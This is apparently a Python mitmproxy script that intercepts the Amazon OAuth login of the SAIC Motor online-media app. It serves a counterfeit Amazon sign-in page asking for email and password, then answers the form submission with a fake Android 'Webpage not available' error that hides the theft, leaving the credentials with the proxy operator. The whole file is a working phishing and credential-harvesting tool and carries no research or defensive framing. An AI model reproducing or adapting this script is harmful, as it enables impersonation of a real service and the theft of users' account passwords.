from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    # Check if the request is targeting the "/ap/oa" endpoint
    if "/ap/oa" in flow.request.pretty_url:
        # Check if the redirect_uri parameter matches the problematic URI
        if "redirect_uri=amzn%3A%2F%2Fcom.saicmotor.onlinemedia" in flow.request.pretty_url:
            # Serve the custom login page
            custom_html = """
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Amazon Login</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        margin: 0;
                        padding: 0;
                        background-color: #f7f7f7;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                    }
                    .login-container {
                        background-color: #fff;
                        padding: 20px;
                        width: 300px;
                        border: 1px solid #ddd;
                        border-radius: 5px;
                        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                    }
                    .amazon-logo {
                        text-align: center;
                        margin-bottom: 20px;
                    }
                    .amazon-logo img {
                        width: 100px;
                    }
                    .form-group {
                        margin-bottom: 15px;
                    }
                    .form-group label {
                        display: block;
                        font-size: 14px;
                        margin-bottom: 5px;
                        color: #333;
                    }
                    .form-group input {
                        width: 100%;
                        padding: 10px;
                        font-size: 14px;
                        border: 1px solid #ccc;
                        border-radius: 3px;
                        box-sizing: border-box;
                    }
                    .sign-in-btn {
                        width: 100%;
                        background-color: #f0c14b;
                        color: #111;
                        border: 1px solid #a88734;
                        padding: 10px;
                        font-size: 16px;
                        border-radius: 3px;
                        cursor: pointer;
                    }
                    .sign-in-btn:hover {
                        background-color: #ddb347;
                    }
                    .footer {
                        margin-top: 20px;
                        font-size: 12px;
                        text-align: center;
                        color: #555;
                    }
                </style>
            </head>
            <body>
                <div class="login-container">
                    <div class="amazon-logo">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
                    </div>
                    <form action="/login" method="POST">
                        <div class="form-group">
                            <label for="email">Email or mobile phone number</label>
                            <input type="text" id="email" name="email" required>
                        </div>
                        <div class="form-group">
                            <label for="password">Password</label>
                            <input type="password" id="password" name="password" required>
                        </div>
                        <button type="submit" class="sign-in-btn">Sign-In</button>
                    </form>
                    <div class="footer">
                        <p>© 2024 Amazon.com, Inc. or its affiliates</p>
                    </div>
                </div>
            </body>
            </html>
            """
            # Return the custom HTML response
            flow.response = http.Response.make(
                200,  # HTTP status code
                custom_html.encode("utf-8"),  # Response body
                {"Content-Type": "text/html"}  # Headers
            )
            # Log the event
            print("Custom Amazon login page served for: ", flow.request.pretty_url)

def response(flow: http.HTTPFlow) -> None:
    # Check if the form submission is sent to "/login"
    if flow.request.path == "/login" and flow.request.method == "POST":
        # Return the Android-style "Webpage not available" error page
        custom_error_page = """
        <html>
          <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
            <title>Webpage not available</title>
            <style type="text/css">
              body { margin-top: 0px; padding-top: 0px;  } /* Used for additional styles, e.g. direction */
              h2   { margin-top: 5px; padding-top: 0px; }
            </style>
          </head>
          <body>
            <img width="50" height="26" align="top" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAaCAMAAADCHv/YAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAitQTFRFn8ctpMo4o8o3ocgzo8k3osk1oMcvo8k2osk0pco6+fzy7vXa9/rs8/jl/P75/v78/v/9osk2ocgy+Pvwo8o4/v79pss68ffho8k1/f77s9JY2umtqMxB/f76stJWvdhtrM5J6vPRpss7oskzpMo3nscs9fnoq85I7/bcp8w+0eOY2+qvstJV+vz08Pbd5e/E5O/En8crnsYrrtBNoMcutNNardBMpss80eSaoMgu5e/Focg08fffz+SYpcs6x96EsNFR5fDFxd2AuNVju9do9PjlzOGOoccvyuCL0OSYpco5ocky7/Xbwtt4zuKT8vfhr9BO8vjjpss+qc5F1eah4O273+y5qs1E0OOWt9Vks9NYqs1Crc9KxNx8oMgx3OqxocgwttRewdt36vPSu9dqqcxB9PnoncYos9JXv9lxqs1FqMxAuNZjsNFTn8cvosgz2eiq5vDI5/DJ/P35ttVg2Omp7vXZ7fTXnscrnsYqstJYuNRg+fvytNRc6PHL///94O26tdNb9Pjnn8csz+OWqs5Fosgx6PLNq85F1eajrM5I///+rc9Lt9Vgt9Rf/P344e29nMUo3uy1ttRgrs9MpMo6wdt2+vzzy+GN+Pvu+/32ockzqs1D3Ouy4e69rM9J8/jk8ffgzeKRq81Fqc1E1OWfxdx+nsct2+mw2emr9vrsxNx9yd+I0uafoMgw5O/CsdJW7PTT6/PS3Oqyn8cuocgxqs5HpMo5////jSIuSwAAAd9JREFUeNqE0vdb00AYB/BLmrShLaWLvTfIHrIEAREBwQkq0w0OkL1kCAoqICpbFPdEUUGakPfP44IWoU0v31/ufZ57P7m8uaAv1BZO5q8H0ZVbhAQUJdQESEVYJzqARByU5+5Gi4Sobr4YUEnF5aR/5Nu4EvHTbuyQkmTUc1cqUtuLFUhQYMtvvNIRMUifgRiGf6hPVEfyhMxOw9t0FWO6cQIQ6Aa9vO7/AYvtko2Q1RkjxIW4xX5NwAQCP+QaAF5d2yQltM8TQBvT9AQk8je6NrVASOrpLnvnLolq1JDGF56BE3lesEIi/E9nAkd4ElGfkyE5AoW3FsMjzfta0c77siF6GeLx9CLe4674X+d2ASWWVt2WTP9HkCEwmo6PEdbB+yxjJ+ZhI5zEfxT3+owsgYYUTLLAprHaCRudaAgWRGt2HMgTbTcvUhF3jjP/R/H5nBYuUugYuCAQFYRE6pB17/gmTqRT1owuCfwIHmMdP2/5o2pPcE3Ad/ICuxdRHB2ftL/FkQB01NWrW1UmhqY1rBn5TMUPgRJZKvOdu1o7EXs4rPndfP49w1F/JZK8YJGu9eUpXYW7dgSXhWkWMvHw++740FvLZPLmoKOA3k/eRPI41InA+fcK4ytnW4ABANzcGZFdd/x+AAAAAElFTkSuQmCC" />
            <h2>Webpage not available</h2>
            <p>The webpage at <strong>https://na.account.amazon.com/ap/oa?response_type=code&amp;redirect_uri=amzn%3A%2F%2Fcom.saicmotor.onlinemedia&amp;client_id=amzn1.application-oa2-client.5d3ac562bc6847eaba07ec96f600838f&amp;amzn_respectRmrMeAuthState=1&amp;amzn_showRmrMe=1&amp;amzn_rmrMeDefaultSelected=1&amp;state=clientId%3Damzn1.application-oa2-client.5d3ac562bc6847eaba07ec96f600838f%26redirectUri%3Damzn%3A%2F%2Fcom.saicmotor.onlinemedia%26clientRequestId%3D6b4f8ea2-d39f-4c10-8e88-b2017bde508c%26InteractiveRequestType%3Dcom.amazon.identity.auth.device.authorization.request.authorize%26com.amazon.identity.auth.device.authorization.return_auth_code%3Dtrue&amp;scope=amazon_music%3Aaccess&amp;appIdentifier=eyJwYWNrYWdlIjoiY29tLnNhaWNtb3Rvci5vbmxpbmVtZWRpYSIsIk1ENSI6WyI4ZGRiMzQyZjJk%0AYTU0MDg0MDJkNzU2OGFmMjFlMjlmOSJdLCJTSEEtMjU2IjpbImM4YTJlOWJjY2Y1OTdjMmZiNmRj%0ANjZiZWUyOTNmYzEzZjJmYzQ3ZWM3N2JjNmIyYjBkNTJjMTFmNTExOTJhYjgiXX0%3D%0A&amp;sw_ver=LWAAndroidSDK3.0.6&amp;code_challenge_method=plain&amp;com.amazon.oauth2.options=%7B%22workflow_data%22%3A%7B%7D%7D&amp;code_challenge=01234567890123456789012345678901234567890123456789&amp;language=en_US</strong> could not be loaded because:</p>
            <p>net::ERR_CONNECTION_REFUSED</p>
          </body>
        </html>
        """
        # Return the custom error page
        flow.response = http.Response.make(
            404,  # HTTP status code
            custom_error_page.encode("utf-8"),  # Response body
            {"Content-Type": "text/html"}  # Headers
        )
        # Log the event
        print("Android-style error page served for login attempt.")

